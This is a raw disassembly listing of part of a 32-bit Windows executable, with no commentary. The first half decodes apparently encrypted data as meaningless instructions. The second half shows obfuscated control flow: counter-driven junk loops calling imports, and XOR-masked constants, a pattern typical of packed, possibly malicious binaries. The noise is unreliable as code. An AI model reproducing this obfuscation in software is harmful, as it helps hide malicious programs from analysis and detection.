  40bbdd:	lds    ecx,FWORD PTR [ebx]
  40bbdf:	fbstp  TBYTE PTR [esi-0x7b]
  40bbe2:	inc    edi
  40bbe3:	cmp    DWORD PTR [ebx],esi
  40bbe5:	icebp  
  40bbe6:	adc    ebp,DWORD PTR [ecx]
  40bbe8:	add    edi,DWORD PTR [eax-0x4e]
  40bbeb:	(bad)  
  40bbec:	jg     0x40bc53
  40bbee:	dec    ebp
  40bbef:	xchg   esp,eax
  40bbf0:	lds    ebx,FWORD PTR [edi]
  40bbf2:	mov    dh,0x10
  40bbf4:	dec    ebx
  40bbf5:	enter  0xe0e4,0x21
  40bbf9:	leave  
  40bbfa:	test   DWORD PTR [ebx+0x7a],edx
  40bbfd:	test   DWORD PTR [edi+0x22b78c1d],0x9c3c8ee3
  40bc07:	loop   0x40bc4a
  40bc09:	fadd   QWORD PTR [esp+eiz*4+0x62b0234e]
  40bc10:	clc    
  40bc11:	stos   DWORD PTR es:[edi],eax
  40bc12:	aas    
  40bc13:	push   eax
  40bc14:	loope  0x40bc0c
  40bc16:	test   dl,bl
  40bc18:	adc    eax,0x399f0075
  40bc1d:	popf   
  40bc1e:	push   ds
  40bc1f:	xchg   edx,eax
  40bc20:	mov    gs,WORD PTR [esi+esi*2-0xc0af047]
  40bc27:	jl     0x40bbdf
  40bc29:	xchg   edi,eax
  40bc2a:	dec    edx
  40bc2b:	aaa    
  40bc2c:	mov    eax,ds:0x8168a704
  40bc31:	jmp    0xbf3:0x6dd1
  40bc37:	jne    0x40bc48
  40bc39:	adc    eax,edx
  40bc3b:	addr16 das 
  40bc3d:	jmp    0x40bc06
  40bc3f:	mov    eax,0x231725cc
  40bc44:	retf   0xd1f5
  40bc47:	int3   
  40bc48:	fsub   DWORD PTR [ebx-0x4932c7c6]
  40bc4e:	xchg   edi,eax
  40bc4f:	xchg   ecx,eax
  40bc50:	jbe    0x40bc7b
  40bc52:	in     al,dx
  40bc53:	loop   0x40bc7a
  40bc55:	loop   0x40bc24
  40bc57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc58:	inc    ebp
  40bc59:	mov    edx,0xb6ea67c7
  40bc5e:	in     al,dx
  40bc5f:	jp     0x40bc71
  40bc61:	outs   dx,DWORD PTR ds:[esi]
  40bc62:	inc    esi
  40bc63:	sub    DWORD PTR [ecx+0x55e02c16],eax
  40bc69:	jne    0x40bc9f
  40bc6b:	rcl    BYTE PTR [ebx+0x11],cl
  40bc6e:	cmp    ebx,DWORD PTR [edx-0x22]
  40bc71:	test   eax,0x4cd3ffa4
  40bc76:	gs ins DWORD PTR es:[edi],dx
  40bc78:	cwde   
  40bc79:	adc    esi,ebp
  40bc7b:	cmp    BYTE PTR [edi],dl
  40bc7d:	das    
  40bc7e:	xor    edi,esi
  40bc80:	lods   al,BYTE PTR gs:[esi]
  40bc82:	jmp    0x40bcbd
  40bc84:	ins    BYTE PTR es:[edi],dx
  40bc85:	out    0x9b,eax
  40bc87:	daa    
  40bc88:	pop    ebx
  40bc89:	inc    DWORD PTR [ebp-0x64]
  40bc8c:	dec    esp
  40bc8d:	mov    al,dl
  40bc8f:	push   esi
  40bc90:	ret    
  40bc91:	xchg   DWORD PTR [ecx+0x23],ecx
  40bc94:	jmp    0xe8df:0xf683d89
  40bc9b:	cmp    DWORD PTR [ebx],ebx
  40bc9d:	dec    ebp
  40bc9e:	xor    eax,0xd01cad90
  40bca3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bca4:	or     BYTE PTR [ebp-0x516c378e],bh
  40bcaa:	scas   eax,DWORD PTR es:[edi]
  40bcab:	push   0x43
  40bcad:	retf   
  40bcae:	jge    0x40bc45
  40bcb0:	fidiv  DWORD PTR [ecx-0x1c171089]
  40bcb6:	dec    esp
  40bcb7:	jno    0x40bca8
  40bcb9:	rcr    eax,cl
  40bcbb:	mov    esi,0x43eff3f1
  40bcc0:	mov    WORD PTR [edx+0x735e0638],ss
  40bcc6:	sahf   
  40bcc7:	clc    
  40bcc8:	pop    esp
  40bcc9:	scas   al,BYTE PTR es:[edi]
  40bcca:	push   edx
  40bccb:	and    dl,BYTE PTR [edx-0x70]
  40bcce:	stc    
  40bccf:	cmc    
  40bcd0:	aas    
  40bcd1:	sar    DWORD PTR [eax+0x5e7cd364],cl
  40bcd7:	(bad)  
  40bcd8:	ins    DWORD PTR es:[edi],dx
  40bcd9:	jp     0x40bd0c
  40bcdb:	mov    eax,ds:0x69f78783
  40bce0:	or     DWORD PTR [eax+0x13e664d2],ecx
  40bce6:	jo     0x40bca6
  40bce8:	inc    esi
  40bce9:	mov    bh,0xb5
  40bceb:	test   eax,0x7c4a2233
  40bcf0:	in     eax,dx
  40bcf1:	gs inc edx
  40bcf3:	(bad)  
  40bcf4:	div    BYTE PTR [edx]
  40bcf6:	adc    dl,BYTE PTR [ebx-0x55]
  40bcf9:	sub    DWORD PTR [edx+0x29],eax
  40bcfc:	das    
  40bcfd:	dec    ebp
  40bcfe:	inc    eax
  40bcff:	pop    ecx
  40bd00:	sbb    eax,0xfc43b6da
  40bd05:	jmp    0xd4ccc8d8
  40bd0a:	mov    esi,DWORD PTR [eiz*8+0x55a1f87b]
  40bd11:	pop    edi
  40bd12:	sbb    ah,BYTE PTR [esi-0x16a663e]
  40bd18:	push   0x1f
  40bd1a:	into   
  40bd1b:	in     al,0xbb
  40bd1d:	lahf   
  40bd1e:	shl    esp,0x64
  40bd21:	mov    ebp,DWORD PTR [ebp+ecx*4-0x17732cd0]
  40bd28:	xor    eax,0x6837cff6
  40bd2d:	data16 int3 
  40bd2f:	or     DWORD PTR [ebx-0x10353ea8],0xffffffc8
  40bd36:	enter  0x4e66,0xb7
  40bd3a:	cmc    
  40bd3b:	sub    dl,BYTE PTR [ebp+0x465ca207]
  40bd41:	cmp    DWORD PTR [edx-0x75],eax
  40bd44:	adc    ecx,esp
  40bd46:	dec    esi
  40bd47:	(bad)  
  40bd48:	add    DWORD PTR [ecx],esp
  40bd4a:	(bad)  
  40bd4b:	std    
  40bd4c:	mov    bh,0x83
  40bd4e:	xor    cl,BYTE PTR [ebx-0x16f776f7]
  40bd54:	sbb    al,0x3
  40bd56:	add    BYTE PTR [eax],al
  40bd58:	out    0x4c,al
  40bd5a:	xor    al,0x30
  40bd5c:	mov    ah,0x70
  40bd5e:	loop   0x40bda8
  40bd60:	into   
  40bd61:	xor    BYTE PTR [ecx],bl
  40bd63:	xchg   esp,eax
  40bd64:	aam    0x3d
  40bd66:	ret    0x1cb8
  40bd69:	cmp    BYTE PTR [esi+0x7e],0x7a
  40bd6d:	jge    0x40bded
  40bd6f:	jle    0x40bd1a
  40bd71:	sub    eax,0xc356a139
  40bd76:	push   ss
  40bd77:	push   ss
  40bd78:	cmp    esp,DWORD PTR [ebx]
  40bd7a:	ins    BYTE PTR es:[edi],dx
  40bd7b:	arpl   WORD PTR [edx+eax*2],si
  40bd7e:	call   0xbb52:0x96f33c61
  40bd85:	sub    cl,BYTE PTR [ebp-0x256ad40]
  40bd8b:	pushf  
  40bd8c:	nop
  40bd8d:	mul    dl
  40bd8f:	jp     0x40bd23
  40bd91:	lods   eax,DWORD PTR ds:[esi]
  40bd92:	adc    BYTE PTR [esp+esi*2],al
  40bd95:	cmp    DWORD PTR ds:0xdc1bb1af,esi
  40bd9b:	push   ebx
  40bd9c:	loop   0x40bdf5
  40bd9e:	jns    0x40bd70
  40bda0:	sti    
  40bda1:	pop    ss
  40bda2:	inc    esi
  40bda3:	push   ecx
  40bda4:	sti    
  40bda5:	lock fwait
  40bda7:	ins    BYTE PTR es:[edi],dx
  40bda8:	or     BYTE PTR [eax],0x97
  40bdab:	test   al,0x20
  40bdad:	lds    eax,FWORD PTR [edi+0x78cd4bd6]
  40bdb3:	xchg   esp,eax
  40bdb4:	pop    edx
  40bdb5:	adc    DWORD PTR [eax],0x59a092
  40bdbb:	gs imul esi,esi,0x1
  40bdbf:	enter  0x426,0xc9
  40bdc3:	por    mm4,QWORD PTR [eax+0x174f4c71]
  40bdca:	pop    edi
  40bdcb:	xor    al,0xaf
  40bdcd:	loope  0x40bdbe
  40bdcf:	aas    
  40bdd0:	fdiv   st(2),st
  40bdd2:	adc    ch,BYTE PTR [eax+0x484d3a50]
  40bdd8:	daa    
  40bdd9:	mov    ebx,0x148427b9
  40bdde:	cmc    
  40bddf:	jmp    0x71901d83
  40bde4:	xchg   esi,eax
  40bde5:	call   0x10e22a01
  40bdea:	inc    ecx
  40bdeb:	and    ch,BYTE PTR [ecx+edx*1]
  40bdee:	shr    DWORD PTR [edi+0x69aac3e3],1
  40bdf4:	push   esi
  40bdf5:	pop    edx
  40bdf6:	adc    dl,BYTE PTR [ebx+0x28c99648]
  40bdfc:	sbb    al,0xfa
  40bdfe:	iret   
  40bdff:	adc    BYTE PTR [ecx],0xe0
  40be02:	fcmovnu st,st(5)
  40be04:	dec    edi
  40be05:	call   0x9295:0xcca4e0da
  40be0c:	rcr    DWORD PTR [edx+0x13b5074e],cl
  40be12:	or     dl,BYTE PTR gs:[edi]
  40be15:	cmp    ch,BYTE PTR [edx]
  40be17:	xchg   ebp,eax
  40be18:	repnz xor ecx,DWORD PTR [eax-0x1677505d]
  40be1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be20:	sbb    DWORD PTR [ebx+esi*8-0x163f50b8],edx
  40be27:	or     eax,0xed9e96c3
  40be2c:	rol    DWORD PTR [ebx-0x16],0x85
  40be30:	adc    BYTE PTR [edx-0x6f1388d2],cl
  40be36:	pop    ecx
  40be37:	or     dl,ch
  40be39:	repnz les ecx,FWORD PTR cs:[eiz*8-0x53e1210c]
  40be42:	add    DWORD PTR [esi+0x32],ecx
  40be45:	popw   ds
  40be47:	int    0x87
  40be49:	jl     0x40bdd4
  40be4b:	test   BYTE PTR [esi+0x7eed7c40],0xfd
  40be52:	imul   esi,DWORD PTR [ebp+0x76ace52f],0xb27ca4d6
  40be5c:	pop    ebx
  40be5d:	ret    0x7b1
  40be60:	pop    es
  40be61:	xchg   esi,eax
  40be62:	ins    BYTE PTR es:[edi],dx
  40be63:	xor    al,BYTE PTR [eax+edi*8-0x3f]
  40be67:	cmp    al,0xfb
  40be69:	inc    esp
  40be6a:	inc    ecx
  40be6b:	sbb    eax,0x3888a36c
  40be70:	xchg   bh,bh
  40be72:	inc    esp
  40be73:	pop    edx
  40be74:	mov    esi,0x48dc828d
  40be79:	push   eax
  40be7a:	mov    BYTE PTR ds:0x63d4ef6,bl
  40be80:	(bad)  
  40be81:	mov    edi,0x35874881
  40be86:	shl    BYTE PTR [ebx],0x75
  40be89:	push   esp
  40be8a:	xchg   BYTE PTR ds:0x54131063,al
  40be90:	hlt    
  40be91:	pop    ebx
  40be92:	push   ds
  40be93:	xor    cl,BYTE PTR [ebx+0x46dafaa5]
  40be99:	pop    eax
  40be9a:	mov    WORD PTR [edx],ss
  40be9c:	hlt    
  40be9d:	xchg   edi,eax
  40be9e:	push   ebx
  40be9f:	inc    eax
  40bea0:	cdq    
  40bea1:	ins    DWORD PTR es:[edi],dx
  40bea2:	or     BYTE PTR [ecx-0x1b],ah
  40bea5:	stos   DWORD PTR es:[edi],eax
  40bea6:	repnz ficom DWORD PTR [ecx+0x1a6af2e]
  40bead:	loop   0x40becb
  40beaf:	addr16 pushf 
  40beb1:	stc    
  40beb2:	xor    eax,0x8247ca5b
  40beb7:	fsubr  QWORD PTR [ecx-0x15]
  40beba:	hlt    
  40bebb:	mov    ecx,DWORD PTR [esi+0x57]
  40bebe:	outs   dx,DWORD PTR ds:[esi]
  40bebf:	push   ebx
  40bec0:	retf   
  40bec1:	lea    ebp,ds:0xaa6ec434
  40bec7:	xor    eax,0x155796ee
  40becc:	xchg   ecx,eax
  40becd:	sub    eax,0x572c8ceb
  40bed2:	enter  0xddc6,0x10
  40bed6:	and    al,0xea
  40bed8:	ret    
  40bed9:	or     ah,BYTE PTR [ebx-0x5549ea78]
  40bedf:	xchg   ebx,eax
  40bee0:	or     BYTE PTR [ecx+0x19800474],dl
  40bee6:	repnz sub eax,0x6000974f
  40beec:	or     ch,BYTE PTR [eax+0x6c]
  40beef:	arpl   WORD PTR [ebp-0x70],bx
  40bef2:	call   0xb607:0x82737319
  40bef9:	clc    
  40befa:	clc    
  40befb:	mov    DWORD PTR gs:[eax],0xc131ef8
  40bf02:	xchg   esi,eax
  40bf03:	and    al,0x55
  40bf05:	jge    0x40bf31
  40bf07:	sahf   
  40bf08:	xchg   esp,eax
  40bf09:	mov    DWORD PTR [edi+0x2],edx
  40bf0c:	lea    ebx,[edi+0x54b39a97]
  40bf12:	bound  ebx,QWORD PTR [eax+0x11c0f76c]
  40bf18:	daa    
  40bf19:	fsub   DWORD PTR [ecx]
  40bf1b:	jg     0x40bec4
  40bf1d:	inc    edx
  40bf1e:	cmp    bh,0xd1
  40bf21:	xor    ch,dl
  40bf23:	add    eax,0x1675ccba
  40bf28:	fisubr WORD PTR [ecx-0x36fe59f9]
  40bf2e:	(bad)  
  40bf2f:	add    eax,0x53bec976
  40bf34:	jecxz  0x40becf
  40bf36:	and    DWORD PTR [edi],ecx
  40bf38:	je     0x40bfa6
  40bf3a:	xchg   ebp,eax
  40bf3b:	test   eax,0xeaf2d3f1
  40bf40:	rcr    BYTE PTR [edx+ecx*8+0x52],1
  40bf44:	(bad)  
  40bf45:	into   
  40bf46:	int    0xb8
  40bf48:	jo     0x40bf86
  40bf4a:	cmp    ecx,DWORD PTR [ecx]
  40bf4c:	and    eax,0x419fd319
  40bf51:	pushf  
  40bf52:	inc    eax
  40bf53:	jno    0x40bf75
  40bf55:	ins    BYTE PTR es:[edi],dx
  40bf56:	mov    dl,0x7c
  40bf58:	in     al,0x1e
  40bf5a:	ja     0x40bf42
  40bf5c:	mov    bh,BYTE PTR [eax]
  40bf5e:	mov    edx,0x7936246
  40bf63:	stc    
  40bf64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf65:	(bad)  
  40bf66:	adc    DWORD PTR [eax],esp
  40bf68:	(bad)  
  40bf6a:	adc    ebp,DWORD PTR [ecx]
  40bf6c:	jge    0x40bfe1
  40bf6e:	out    0xd5,eax
  40bf70:	push   edx
  40bf71:	jecxz  0x40bf46
  40bf73:	nop
  40bf74:	push   es
  40bf75:	or     esi,DWORD PTR [esi]
  40bf77:	hlt    
  40bf78:	es (bad) 
  40bf7a:	adc    ebp,edx
  40bf7c:	data16 mov ah,0x5c
  40bf7f:	xchg   al,bl
  40bf81:	inc    edx
  40bf82:	push   edi
  40bf83:	nop
  40bf84:	je     0x40bf9b
  40bf86:	sub    ebx,edx
  40bf88:	dec    edi
  40bf89:	nop
  40bf8a:	repnz out dx,al
  40bf8c:	push   ebp
  40bf8d:	or     esi,edx
  40bf8f:	loopne 0x40bf28
  40bf91:	push   esp
  40bf92:	add    eax,DWORD PTR [eax]
  40bf94:	cwde   
  40bf95:	sbb    DWORD PTR [ebp-0x3d69a77e],ecx
  40bf9b:	mov    esi,0xd877fe62
  40bfa0:	pusha  
  40bfa1:	rol    BYTE PTR [ebx],1
  40bfa3:	or     eax,0x36c08742
  40bfa8:	jmp    0x40bf44
  40bfaa:	out    dx,eax
  40bfab:	mov    eax,0xd9c1723d
  40bfb0:	mov    WORD PTR [ebx+0x5dc8a517],cs
  40bfb6:	ss jl  0x40c001
  40bfb9:	pop    edx
  40bfba:	mov    esp,0xf43a1c1f
  40bfbf:	inc    ebp
  40bfc0:	int3   
  40bfc1:	mov    ah,0x2a
  40bfc3:	or     eax,esi
  40bfc5:	das    
  40bfc6:	dec    ebx
  40bfc7:	lock mov bh,0x62
  40bfca:	mov    bl,0xfc
  40bfcc:	(bad)  
  40bfcd:	pop    ds
  40bfce:	cmc    
  40bfcf:	pop    ecx
  40bfd0:	jl     0x40bfba
  40bfd2:	sub    ebp,DWORD PTR [edi+0x67]
  40bfd5:	xchg   ebx,eax
  40bfd6:	adc    esp,esi
  40bfd8:	hlt    
  40bfd9:	mov    edi,DWORD PTR [ebx]
  40bfdb:	xchg   ecx,eax
  40bfdc:	jno    0x40c008
  40bfde:	mov    ah,cl
  40bfe0:	pop    ebx
  40bfe1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bfe2:	push   es
  40bfe3:	bound  edx,QWORD PTR [ecx]
  40bfe5:	sub    bl,BYTE PTR [ebx-0x31]
  40bfe8:	in     eax,0xc7
  40bfea:	cmp    BYTE PTR ds:0x9f69a5e3,ch
  40bff0:	jae    0x40bf82
  40bff2:	adc    BYTE PTR [ebx],bl
  40bff4:	jecxz  0x40c05b
  40bff6:	inc    esp
  40bff7:	clc    
  40bff8:	aaa    
  40bff9:	sub    bl,bl
  40bffb:	sub    BYTE PTR [ecx+0x1],ah
  40bffe:	add    esi,edx
  40c000:	arpl   WORD PTR [eax],cx
  40c002:	dec    ecx
  40c003:	and    eax,0x7cadd1ef
  40c008:	pop    eax
  40c009:	cmp    eax,0x79000f09
  40c00e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c00f:	mov    ebx,0x74579170
  40c014:	and    BYTE PTR [eax-0x3c],0xfc
  40c018:	add    BYTE PTR [edx-0x69dc3d07],al
  40c01e:	das    
  40c01f:	clc    
  40c020:	sub    al,0xd9
  40c022:	inc    ebp
  40c023:	adc    DWORD PTR [edx-0x5d9e99e5],0x869e5c79
  40c02d:	rcr    BYTE PTR [ebx],cl
  40c02f:	pop    ebp
  40c030:	and    DWORD PTR [esp+edi*8],esi
  40c033:	push   edx
  40c034:	clc    
  40c035:	jno    0x40c06a
  40c037:	push   ebp
  40c038:	inc    ecx
  40c039:	cs xor esp,ecx
  40c03c:	out    dx,eax
  40c03d:	repz cmc 
  40c03f:	int3   
  40c040:	xchg   ebp,eax
  40c041:	sub    eax,0xf3885b02
  40c046:	dec    ebx
  40c047:	xchg   edi,eax
  40c048:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c049:	rol    BYTE PTR ds:0xe8a03ac4,1
  40c04f:	aas    
  40c050:	jne    0xb062f054
  40c056:	cmp    al,0x65
  40c058:	stos   DWORD PTR es:[edi],eax
  40c059:	shl    BYTE PTR [esi+0x4a],0x31
  40c05d:	enter  0xb601,0xf6
  40c061:	sub    ah,BYTE PTR [eax]
  40c063:	mov    ds,WORD PTR [ebx+ebx*2+0x19]
  40c067:	stos   BYTE PTR es:[edi],al
  40c068:	xchg   DWORD PTR [ecx-0xaed45],esp
  40c06e:	mov    esi,0x6fc13d18
  40c073:	out    dx,al
  40c074:	mov    eax,DWORD PTR [ebp+0xc]
  40c077:	mov    eax,DWORD PTR [ebp+0x8]
  40c07a:	push   DWORD PTR [ebp-0x8]
  40c07d:	call   0x40746a
  40c082:	mov    eax,DWORD PTR [ebp-0xc]
  40c085:	cmp    eax,ebx
  40c087:	je     0x4098f8
  40c08d:	mov    eax,DWORD PTR [ebp-0x8]
  40c090:	mov    eax,DWORD PTR [eax]
  40c092:	pop    edi
  40c093:	pop    esi
  40c094:	pop    ebx
  40c095:	leave  
  40c096:	ret    0xc
  40c099:	push   ebp
  40c09a:	mov    ebp,esp
  40c09c:	sub    esp,0x30
  40c09f:	adc    DWORD PTR ds:0x433717,ecx
  40c0a5:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40c0ac:	xor    ecx,ecx
  40c0ae:	or     ecx,DWORD PTR ds:0x433727
  40c0b4:	and    DWORD PTR ds:0x433783,ecx
  40c0ba:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40c0c1:	mov    ecx,DWORD PTR [ebp-0x4]
  40c0c4:	mov    DWORD PTR ds:0x4337b7,0x13
  40c0ce:	cmp    DWORD PTR ds:0x4337b7,0x0
  40c0d5:	je     0x40c103
  40c0db:	cmp    DWORD PTR ds:0x4337b7,0x1a
  40c0e2:	jne    0x40c0f3
  40c0e8:	push   0x1b76
  40c0ed:	call   DWORD PTR ds:0x412020
  40c0f3:	mov    eax,ds:0x4337b7
  40c0f8:	dec    eax
  40c0f9:	mov    ds:0x4337b7,eax
  40c0fe:	jmp    0x40c0ce
  40c103:	push   ebx
  40c104:	mov    DWORD PTR ds:0x4337e7,0x19
  40c10e:	cmp    DWORD PTR ds:0x4337e7,0x0
  40c115:	je     0x40c1bf
  40c11b:	cmp    DWORD PTR ds:0x4337e7,0xa
  40c122:	jne    0x40c133
  40c128:	push   0x4904
  40c12d:	call   DWORD PTR ds:0x412024
  40c133:	cmp    DWORD PTR ds:0x4337e7,0xb
  40c13a:	jne    0x40c14d
  40c140:	mov    ebx,DWORD PTR ds:0x4337e7
  40c146:	dec    ebx
  40c147:	mov    DWORD PTR ds:0x4337e7,ebx
  40c14d:	mov    ebx,DWORD PTR ds:0x4337e7
  40c153:	dec    ebx
  40c154:	mov    DWORD PTR ds:0x4337e7,ebx
  40c15a:	jmp    0x40c10e
  40c15f:	mov    DWORD PTR ds:0x433783,0x1d
  40c169:	cmp    DWORD PTR ds:0x433783,0x0
  40c170:	je     0x40c1bf
  40c176:	cmp    DWORD PTR ds:0x433783,0x3
  40c17d:	jne    0x40c193
  40c183:	push   0x433880
  40c188:	push   0x400000
  40c18d:	call   DWORD PTR ds:0x412028
  40c193:	cmp    DWORD PTR ds:0x433783,0x4
  40c19a:	jne    0x40c1ad
  40c1a0:	mov    ebx,DWORD PTR ds:0x433783
  40c1a6:	dec    ebx
  40c1a7:	mov    DWORD PTR ds:0x433783,ebx
  40c1ad:	mov    ebx,DWORD PTR ds:0x433783
  40c1b3:	dec    ebx
  40c1b4:	mov    DWORD PTR ds:0x433783,ebx
  40c1ba:	jmp    0x40c169
  40c1bf:	mov    eax,0x7510854
  40c1c4:	adc    ebx,DWORD PTR ds:0x4337ab
  40c1ca:	xor    ecx,eax
  40c1cc:	mov    ebx,0x32729b
  40c1d1:	add    ecx,ebx
  40c1d3:	mov    DWORD PTR [ebp-0x1c],ecx
  40c1d6:	movzx  ecx,BYTE PTR ds:0x4337b7
  40c1dd:	xor    DWORD PTR ds:0x433713,ecx
  40c1e3:	mov    ecx,DWORD PTR [ebp+0x14]
  40c1e6:	or     DWORD PTR ds:0x43371b,0x43377b
  40c1f0:	push   esi
  40c1f1:	push   edi
  40c1f2:	test   ecx,ecx
  40c1f4:	mov    DWORD PTR ds:0x43372b,0x6070
  40c1fe:	je     0x40c2fb
  40c204:	mov    ecx,DWORD PTR [ebp+0x14]
  40c207:	mov    DWORD PTR ds:0x4337a7,0x1d
  40c211:	cmp    DWORD PTR ds:0x4337a7,0x0
  40c218:	je     0x40c2a6
  40c21e:	cmp    DWORD PTR ds:0x4337a7,0x29
  40c225:	jne    0x40c23a
  40c22b:	push   DWORD PTR [ebp-0xc]
  40c22e:	push   DWORD PTR [ebp-0x1c]
  40c231:	push   DWORD PTR [ebp-0x20]
  40c234:	call   DWORD PTR ds:0x41202c
  40c23a:	xor    esi,esi
  40c23c:	or     esi,DWORD PTR ds:0x4337a7
  40c242:	dec    esi
  40c243:	mov    DWORD PTR ds:0x4337a7,esi
  40c249:	jmp    0x40c211
  40c24e:	mov    DWORD PTR ds:0x4337eb,0x10
  40c258:	cmp    DWORD PTR ds:0x4337eb,0x0
  40c25f:	je     0x40c2a6
  40c265:	cmp    DWORD PTR ds:0x4337eb,0x2
  40c26c:	jne    0x40c278
  40c272:	call   DWORD PTR ds:0x4121d8
  40c278:	cmp    DWORD PTR ds:0x4337eb,0x3
  40c27f:	jne    0x40c292
  40c285:	mov    esi,DWORD PTR ds:0x4337eb
  40c28b:	dec    esi
  40c28c:	mov    DWORD PTR ds:0x4337eb,esi
  40c292:	mov    esi,DWORD PTR ds:0x4337eb
  40c298:	dec    esi
  40c299:	mov    DWORD PTR ds:0x4337eb,esi
  40c29f:	jmp    0x40c258
  40c2a4:	and    esi,edi
  40c2a6:	mov    ecx,DWORD PTR [ecx]
  40c2a8:	and    DWORD PTR ds:0x433733,0x0
  40c2b2:	jmp    0x40c2c4
  40c2b7:	mov    esi,DWORD PTR ds:0x433733
  40c2bd:	inc    esi
  40c2be:	mov    DWORD PTR ds:0x433733,esi
  40c2c4:	cmp    DWORD PTR ds:0x433733,0x15
  40c2cb:	jae    0x40c2f8
  40c2d1:	cmp    DWORD PTR ds:0x433733,0x1e
  40c2d8:	jne    0x40c2ed
  40c2de:	push   DWORD PTR [ebp-0xc]
  40c2e1:	push   DWORD PTR [ebp-0x1c]
  40c2e4:	push   DWORD PTR [ebp-0x18]
  40c2e7:	call   DWORD PTR ds:0x4123a4
  40c2ed:	jmp    0x40c2b7
  40c2f2:	sbb    DWORD PTR ds:0x4337f3,edx
  40c2f8:	mov    DWORD PTR [ebp-0x1c],ecx
  40c2fb:	mov    ecx,DWORD PTR ds:0x4337eb
  40c301:	adc    DWORD PTR ds:0x4337fb,ecx
  40c307:	imul   edx,eax
  40c30a:	mov    esi,DWORD PTR ds:0x43374b
  40c310:	xor    ecx,ecx
  40c312:	or     ecx,DWORD PTR ds:0x433787
  40c318:	sub    esi,ecx
  40c31a:	or     esi,DWORD PTR [esi+ecx*1]
  40c31d:	mov    ecx,0x4573
  40c322:	mov    esi,DWORD PTR ds:0x4337e3
  40c328:	mov    esi,DWORD PTR [esi]
  40c32a:	sub    DWORD PTR ds:0x43372f,esi
  40c330:	add    edx,ecx
  40c332:	mov    esi,0x7879
  40c337:	and    DWORD PTR ds:0x4337a7,edi
  40c33d:	mov    edi,0x1556
  40c342:	sbb    DWORD PTR ds:0x433733,0x433767
  40c34c:	xchg   esi,ecx
  40c34e:	and    DWORD PTR ds:0x4337ff,0x0
  40c358:	xor    ecx,ecx
  40c35a:	add    ecx,DWORD PTR ds:0x4337ff
  40c360:	inc    ecx
  40c361:	mov    DWORD PTR ds:0x4337ff,ecx
  40c367:	cmp    DWORD PTR ds:0x4337ff,0xf
  40c36e:	jne    0x40c37f
  40c374:	push   0x8dd2
  40c379:	call   DWORD PTR ds:0x4121dc
  40c37f:	cmp    DWORD PTR ds:0x4337ff,0xe
  40c386:	jne    0x40c399
  40c38c:	mov    ecx,DWORD PTR ds:0x4337ff
  40c392:	inc    ecx
  40c393:	mov    DWORD PTR ds:0x4337ff,ecx
  40c399:	cmp    DWORD PTR ds:0x4337ff,0x1d
  40c3a0:	jb     0x40c358
  40c3a6:	neg    ecx
  40c3a8:	sub    edx,edi
  40c3aa:	adc    ecx,DWORD PTR ds:0x43376b
  40c3b0:	xor    esi,esi
  40c3b2:	add    DWORD PTR ds:0x4337ab,0x7522
  40c3bc:	mov    DWORD PTR [ebp-0x28],esi
  40c3bf:	xor    ecx,0x6487
  40c3c5:	mov    DWORD PTR [ebp-0x2c],esi
  40c3c8:	or     DWORD PTR ds:0x4337ab,ecx
  40c3ce:	mov    DWORD PTR [ebp-0x14],esi
  40c3d1:	mov    DWORD PTR [ebp-0x8],esi
  40c3d4:	mov    ecx,DWORD PTR [ebp-0x18]
  40c3d7:	add    DWORD PTR ds:0x43382b,0x43383b
  40c3e1:	xor    ecx,eax
  40c3e3:	and    DWORD PTR ds:0x4337af,0x4337bf
  40c3ed:	xor    edi,edi
  40c3ef:	xor    DWORD PTR ds:0x4337c3,ebx
  40c3f5:	add    ecx,ebx
  40c3f7:	mov    DWORD PTR ds:0x433737,0x6c1e
  40c401:	mov    DWORD PTR [ebp-0x20],ecx
  40c404:	mov    DWORD PTR ds:0x43372b,edi
  40c40a:	mov    eax,DWORD PTR [ebp-0x20]
  40c40d:	je     0x40cc0f
  40c413:	sbb    DWORD PTR ds:0x43372f,0x13ee
  40c41d:	mov    eax,DWORD PTR [ebp-0x4]
  40c420:	adc    DWORD PTR ds:0x433723,0x47a9
  40c42a:	xor    eax,0x7510854
  40c42f:	sbb    DWORD PTR ds:0x4337e7,0x7bc1
  40c439:	add    eax,ebx
  40c43b:	cmp    edi,eax
  40c43d:	mov    DWORD PTR ds:0x4337f3,0x1580
  40c447:	jne    0x40c892
  40c44d:	push   DWORD PTR [ebp+0x8]
  40c450:	call   0x411718
  40c455:	mov    DWORD PTR [ebp-0x20],eax
  40c458:	adc    DWORD PTR ds:0x4337a7,edi
  40c45e:	mov    eax,DWORD PTR [ebp-0x4]
  40c461:	and    DWORD PTR ds:0x4337eb,0x0
  40c46b:	jmp    0x40c47f
  40c470:	xor    ecx,ecx
  40c472:	xor    ecx,DWORD PTR ds:0x4337eb
  40c478:	inc    ecx
  40c479:	mov    DWORD PTR ds:0x4337eb,ecx
  40c47f:	cmp    DWORD PTR ds:0x4337eb,0x1c
  40c486:	jae    0x40c4c3
  40c48c:	cmp    DWORD PTR ds:0x4337eb,0xb
  40c493:	jne    0x40c4a2
  40c499:	push   DWORD PTR [ebp-0x1c]
  40c49c:	call   DWORD PTR ds:0x4123a8
  40c4a2:	cmp    DWORD PTR ds:0x4337eb,0xa
  40c4a9:	jne    0x40c4be
  40c4af:	xor    ecx,ecx
  40c4b1:	xor    ecx,DWORD PTR ds:0x4337eb
  40c4b7:	inc    ecx
  40c4b8:	mov    DWORD PTR ds:0x4337eb,ecx
  40c4be:	jmp    0x40c470
  40c4c3:	mov    ecx,DWORD PTR [ebp-0x20]
  40c4c6:	xor    esi,esi
  40c4c8:	or     esi,DWORD PTR ds:0x4337eb
  40c4ce:	and    esi,DWORD PTR ds:0x4337ef
  40c4d4:	mov    DWORD PTR ds:0x4337eb,esi
  40c4da:	mov    esi,0x7510854
  40c4df:	sub    DWORD PTR ds:0x4337bb,0x5d26
  40c4e9:	xor    eax,esi
  40c4eb:	xor    DWORD PTR ds:0x433783,0xf10
  40c4f5:	add    eax,ebx
  40c4f7:	mov    DWORD PTR ds:0x43376f,0x5b3f
  40c501:	cmp    ecx,eax
  40c503:	je     0x40cbf3
